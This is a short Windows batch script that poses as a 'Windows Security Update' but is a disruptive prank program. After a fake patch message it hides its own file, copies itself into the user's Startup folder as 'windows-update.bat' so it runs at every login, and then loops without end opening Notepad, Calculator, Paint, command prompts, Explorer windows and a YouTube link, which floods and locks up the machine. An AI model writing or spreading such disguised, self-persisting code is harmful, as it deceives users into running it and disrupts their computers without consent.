@echo off
title Windows Security Update
color 0A
mode con: cols=40 lines=10
echo Installing security patch...
timeout /t 3 /nobreak >nul
cls

:: Hide the script
attrib +h "%~f0"

:: Copy itself to startup
set scriptName=prank.bat
set destFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
copy "%~f0" "%destFolder%\windows-update.bat" /Y

:: Loop to spam applications
:loop
start notepad
start calc
start mspaint
start cmd
start explorer
start https://www.youtube.com/watch?v=dQw4w9WgXcQ
timeout /t 1 /nobreak >nul
goto loop
